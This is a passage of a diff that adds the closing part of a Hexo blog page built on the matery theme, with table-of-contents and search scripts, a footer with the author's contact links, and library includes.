+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://lddp.github.io/" target="_blank">wh1te</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 采用
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>的主题搭建.
+        </div>
+        <div class="col s12 m4 l4 social-link"><a href="https://github.com/lddp" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+    <i class="fa fa-github"></i>
+</a>
+<a href="mailto:1061722245@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <i class="fa fa-envelope-open"></i>
+</a>
+<a href="#!" class="tooltipped" data-tooltip="QQ联系我: 1061722245" data-position="top" data-delay="50">
+    <i class="fa fa-qq"></i>
+</a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title">Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input" autofocus="">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/js/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+<script type="text/javascript" src="/js/love.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+</body>
+</html>
